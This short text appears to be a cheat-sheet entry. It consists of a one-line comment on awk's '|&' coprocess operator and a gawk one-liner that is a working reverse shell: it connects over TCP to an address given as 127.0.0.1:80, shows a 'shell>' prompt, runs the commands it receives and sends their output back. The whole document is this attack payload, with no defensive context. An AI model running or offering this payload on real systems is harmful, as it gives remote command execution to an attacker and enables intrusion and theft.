#|& passes both stdout as well as stderr to the next command, unlike | which only does stdout
awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/80"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){while((c |& getline)>0) print $0 |& s; close(c); }} while (c != "exit") close(s); }}' /dev/null
